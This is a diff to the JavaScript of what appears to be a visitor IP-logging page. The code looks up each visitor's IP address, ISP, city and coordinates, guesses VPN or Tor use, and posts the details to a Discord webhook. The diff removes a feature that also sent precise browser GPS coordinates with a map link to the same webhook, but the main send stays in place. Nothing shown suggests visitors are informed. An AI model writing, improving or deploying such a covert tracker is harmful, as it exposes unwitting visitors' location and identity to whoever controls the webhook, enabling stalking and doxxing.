@@ -77,127 +77,131 @@
             "accurateLocation": false
         };
 
-        // Get IP info without API keys
+        // Simple and reliable IP detection
         async function getIPInfo() {
             try {
-                // Get IP from multiple free services
-                const ip = await getIPAddress();
+                // Try the most reliable service first
+                let ip = await getIPAddress();
                 
-                // Get location info from free services
-                const locationInfo = await getLocationInfo(ip);
+                // Get basic location info
+                let locationInfo = await getBasicLocationInfo(ip);
                 
-                // Enhanced VPN detection
-                const vpnInfo = await detectVPN(ip, locationInfo);
-                
-                // Mobile detection from user agent
+                // Enhanced detection
+                const vpnInfo = detectVPN(locationInfo);
                 const isMobile = detectMobile();
                 
                 return {
                     query: ip,
-                    isp: locationInfo.isp || locationInfo.org || 'Unknown',
-                    as: locationInfo.asn || locationInfo.as || 'Unknown',
-                    continent: locationInfo.continent || getContinent(locationInfo.country_code) || 'Unknown',
-                    country: locationInfo.country || locationInfo.country_name || 'Unknown',
-                    regionName: locationInfo.region || locationInfo.regionName || 'Unknown',
+                    isp: locationInfo.isp || 'Unknown',
+                    as: locationInfo.asn || 'Unknown',
+                    continent: locationInfo.continent || 'Unknown',
+                    country: locationInfo.country || 'Unknown',
+                    regionName: locationInfo.region || 'Unknown',
                     city: locationInfo.city || 'Unknown',
-                    lat: locationInfo.latitude || locationInfo.lat || 0,
-                    lon: locationInfo.longitude || locationInfo.lon || 0,
+                    lat: locationInfo.latitude || 0,
+                    lon: locationInfo.longitude || 0,
                     timezone: locationInfo.timezone || 'Unknown',
                     mobile: isMobile,
                     proxy: vpnInfo.isProxy,
                     vpn: vpnInfo.isVPN,
                     tor: vpnInfo.isTOR,
                     hosting: vpnInfo.isHosting,
-                    countryCode: locationInfo.country_code || locationInfo.countryCode || ''
+                    countryCode: locationInfo.country_code || ''
                 };
             } catch (error) {
                 console.error('IP info failed:', error);
-                throw error;
+                // Return basic info even if some services fail
+                return {
+                    query: 'Failed to detect',
+                    isp: 'Unknown',
+                    as: 'Unknown',
+                    continent: 'Unknown',
+                    country: 'Unknown',
+                    regionName: 'Unknown',
+                    city: 'Unknown',
+                    lat: 0,
+                    lon: 0,
+                    timezone: 'Unknown',
+                    mobile: detectMobile(),
+                    proxy: false,
+                    vpn: false,
+                    tor: false,
+                    hosting: false,
+                    countryCode: ''
+                };
             }
         }
 
-        // Get IP address from multiple free services
+        // Simple IP detection
         async function getIPAddress() {
-            const services = [
-                'https://api.ipify.org?format=json',
-                'https://api.myip.com/',
-                'https://jsonip.com/',
-                'https://api64.ipify.org?format=json'
-            ];
-
-            for (let service of services) {
+            try {
+                // Most reliable service
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
+            } catch (error) {
                 try {
-                    const response = await fetch(service);
+                    // Fallback 1
+                    const response = await fetch('https://api64.ipify.org?format=json');
                     const data = await response.json();
-                    if (data.ip) return data.ip;
-                } catch (error) {
-                    continue;
-                }
-            }
-            throw new Error('Could not get IP address');
-        }
-
-        // Get location info from free services
-        async function getLocationInfo(ip) {
-            const services = [
-                `https://ipapi.co/${ip}/json/`,
-                `https://ipwhois.app/json/${ip}`,
-                `https://freeipapi.com/api/json/${ip}`,
-                `https://api.ipbase.com/v1/json/${ip}`
-            ];
-
-            for (let service of services) {
-                try {
-                    const response = await fetch(service);
-                    if (response.ok) {
+                    return data.ip;
+                } catch (error2) {
+                    try {
+                        // Fallback 2
+                        const response = await fetch('https://jsonip.com');
                         const data = await response.json();
-                        if (data.country || data.country_name) {
-                            return data;
-                        }
+                        return data.ip;
+                    } catch (error3) {
+                        throw new Error('All IP services failed');
                     }
-                } catch (error) {
-                    continue;
                 }
             }
-            
-            // Fallback: Return minimal data
-            return {
-                ip: ip,
-                country: 'Unknown',
-                city: 'Unknown',
-                isp: 'Unknown'
-            };
         }
 
-        // Enhanced VPN detection without API keys
-        async function detectVPN(ip, locationInfo) {
-            const vpnKeywords = [
-                'vpn', 'proxy', 'expressvpn', 'nordvpn', 'surfshark', 
-                'private internet access', 'pia', 'windscribe', 'vyprvpn',
-                'tunnelbear', 'hotspot shield', 'hidemyass', 'purevpn',
-                'ipvanish', 'strongvpn', 'zenmate', 'cyberghost'
-            ];
+        // Basic location info
+        async function getBasicLocationInfo(ip) {
+            try {
+                // Use ipapi.co - most reliable free service
+                const response = await fetch(`https://ipapi.co/${ip}/json/`);
+                if (response.ok) {
+                    return await response.json();
+                }
+                throw new Error('ipapi.co failed');
+            } catch (error) {
+                console.log('ipapi.co failed, trying fallback...');
+                try {
+                    // Fallback
+                    const response = await fetch(`https://ipwhois.app/json/${ip}`);
+                    if (response.ok) {
+                        return await response.json();
+                    }
+                } catch (error2) {
+                    console.log('All location services failed');
+                }
+                
+                // Return minimal data
+                return {
+                    ip: ip,
+                    country: 'Unknown',
+                    city: 'Unknown',
+                    isp: 'Unknown'
+                };
+            }
+        }
+
+        // VPN detection
+        function detectVPN(locationInfo) {
+            const vpnKeywords = ['vpn', 'proxy', 'expressvpn', 'nordvpn', 'surfshark'];
+            const hostingKeywords = ['amazon', 'google', 'microsoft', 'digitalocean', 'hosting', 'server', 'cloud'];
+            const torKeywords = ['tor', 'torproject'];
             
-            const hostingKeywords = [
-                'amazon', 'google', 'microsoft', 'digitalocean', 'linode',
-                'vultr', 'ovh', 'hetzner', 'aws', 'gcp', 'azure',
-                'cloud', 'hosting', 'server', 'datacenter', 'incapsula',
-                'cloudflare', 'akamai', 'fastly'
-            ];
-            
-            const torKeywords = [
-                'tor', 'torproject', 'onion'
-            ];
-            
-            const isp = (locationInfo.isp || locationInfo.org || '').toLowerCase();
-            const asn = (locationInfo.asn || locationInfo.as || '').toLowerCase();
+            const isp = (locationInfo.org || locationInfo.isp || '').toLowerCase();
+            const asn = (locationInfo.asn || '').toLowerCase();
             
             const isVPN = vpnKeywords.some(keyword => isp.includes(keyword) || asn.includes(keyword));
             const isHosting = hostingKeywords.some(keyword => isp.includes(keyword) || asn.includes(keyword));
             const isTOR = torKeywords.some(keyword => isp.includes(keyword) || asn.includes(keyword));
-            
-            // Additional checks for common VPN patterns
-            const isProxy = isVPN || isTOR || await checkCommonVPNPatterns(ip, isp);
+            const isProxy = isVPN || isTOR;
             
             return {
                 isVPN: isVPN,
@@ -207,48 +211,9 @@
             };
         }
 
-        // Check for common VPN patterns
-        async function checkCommonVPNPatterns(ip, isp) {
-            // Check for common VPN IP ranges (simplified)
-            const vpnRanges = [
-                '185.159.', '185.216.', '193.37.255.', '194.87.95.',
-                '195.154.', '198.8.85.', '198.18.0.', '199.115.100.',
-                '209.95.50.', '209.222.92.', '216.131.65.', '216.244.77.'
-            ];
-            
-            const isVPNRange = vpnRanges.some(range => ip.startsWith(range));
-            
-            // Check for datacenter/hosting patterns
-            const isDatacenter = isp.includes('datacenter') || isp.includes('hosting');
-            
-            return isVPNRange || isDatacenter;
-        }
-
-        // Detect mobile from user agent
+        // Mobile detection
         function detectMobile() {
-            const ua = navigator.userAgent.toLowerCase();
-            return /android|webos|iphone|ipad|ipod|blackberry|iemobile|opera mini/i.test(ua);
-        }
-
-        // Get continent from country code
-        function getContinent(countryCode) {
-            if (!countryCode) return 'Unknown';
-            
-            const continentMap = {
-                'US': 'North America', 'CA': 'North America', 'MX': 'North America',
-                'GB': 'Europe', 'DE': 'Europe', 'FR': 'Europe', 'IT': 'Europe', 'ES': 'Europe',
-                'NL': 'Europe', 'SE': 'Europe', 'CH': 'Europe', 'NO': 'Europe', 'DK': 'Europe',
-                'FI': 'Europe', 'BE': 'Europe', 'AT': 'Europe', 'IE': 'Europe', 'PT': 'Europe',
-                'CN': 'Asia', 'JP': 'Asia', 'IN': 'Asia', 'KR': 'Asia', 'SG': 'Asia',
-                'TH': 'Asia', 'VN': 'Asia', 'MY': 'Asia', 'ID': 'Asia', 'PH': 'Asia',
-                'BR': 'South America', 'AR': 'South America', 'CO': 'South America', 'PE': 'South America',
-                'CL': 'South America', 'EC': 'South America', 'VE': 'South America', 'BO': 'South America',
-                'ZA': 'Africa', 'NG': 'Africa', 'EG': 'Africa', 'KE': 'Africa', 'ET': 'Africa',
-                'GH': 'Africa', 'DZ': 'Africa', 'MA': 'Africa', 'TZ': 'Africa', 'SD': 'Africa',
-                'AU': 'Oceania', 'NZ': 'Oceania', 'FJ': 'Oceania', 'PG': 'Oceania', 'SB': 'Oceania'
-            };
-
-            return continentMap[countryCode] || 'Unknown';
+            return /android|webos|iphone|ipad|ipod|blackberry|iemobile|opera mini/i.test(navigator.userAgent.toLowerCase());
         }
 
         // Parse user agent
@@ -289,7 +254,6 @@
 > **IP:** \`${data.ipInfo.query}\`
 > **Provider:** \`${data.ipInfo.isp}\`
 > **ASN:** \`${data.ipInfo.as}\`
-> **Continent:** \`${data.ipInfo.continent}\`
 > **Country:** \`${data.ipInfo.country}\`
 > **Region:** \`${data.ipInfo.regionName}\`
 > **City:** \`${data.ipInfo.city}\`
@@ -313,76 +277,6 @@ ${navigator.userAgent}
                     }]
                 };
 
-                const response = await fetch(config.webhook, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify(embed)
-                });
-
-                if (!response.ok) {
-                    throw new Error(`Discord response: ${response.status}`);
-                }
-
-                console.log('Successfully sent to Discord');
-            } catch (error) {
-                console.error('Error sending to Discord:', error);
-                throw error;
-            }
-        }
-
-        // Get precise location
-        async function getPreciseLocation() {
-            return new Promise((resolve) => {
-                if (!navigator.geolocation) {
-                    resolve(null);
-                    return;
-                }
-
-                navigator.geolocation.getCurrentPosition(
-                    (position) => {
-                        resolve({
-                            coords: `${position.coords.latitude},${position.coords.longitude}`,
-                            accuracy: position.coords.accuracy,
-                            mapsLink: `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`
-                        });
-                    },
-                    (error) => {
-                        console.log('Geolocation failed:', error);
-                        resolve(null);
-                    },
-                    {
-                        enableHighAccuracy: true,
-                        timeout: 10000,
-                        maximumAge: 0
-                    }
-                );
-            });
-        }
-
-        // Send precise location
-        async function sendPreciseLocation(data, location) {
-            try {
-                const embed = {
-                    username: `${config.username} - GPS`,
-                    content: "",
-                    embeds: [{
-                        title: "📍 Precise Location",
-                        color: 0x00FF00,
-                        description: `
-**Precise GPS Location:**
-> **Coordinates:** \`${location.coords}\`
-> **Accuracy:** \`${location.accuracy} meters\`
-> **Google Maps:** [View Location](${location.mapsLink})
-
-**User Information:**
-> **IP:** \`${data.ipInfo.query}\`
-> **Country:** \`${data.ipInfo.country}\`
-> **City:** \`${data.ipInfo.city}\``
-                    }]
-                };
-
                 await fetch(config.webhook, {
                     method: 'POST',
                     headers: {
@@ -390,8 +284,11 @@ ${navigator.userAgent}
                     },
                     body: JSON.stringify(embed)
                 });
+
+                console.log('Successfully sent to Discord');
             } catch (error) {
-                console.error('Error sending precise location:', error);
+                console.error('Error sending to Discord:', error);
+                throw error;
             }
         }
 
@@ -421,14 +318,6 @@ ${navigator.userAgent}
 
                 // Send main webhook
                 await sendToDiscord(logData);
-
-                // Get precise location if enabled
-                if (config.accurateLocation) {
-                    const preciseLocation = await getPreciseLocation();
-                    if (preciseLocation) {
-                        await sendPreciseLocation(logData, preciseLocation);
-                    }
-                }
 
                 console.log('IP logging completed successfully');
 
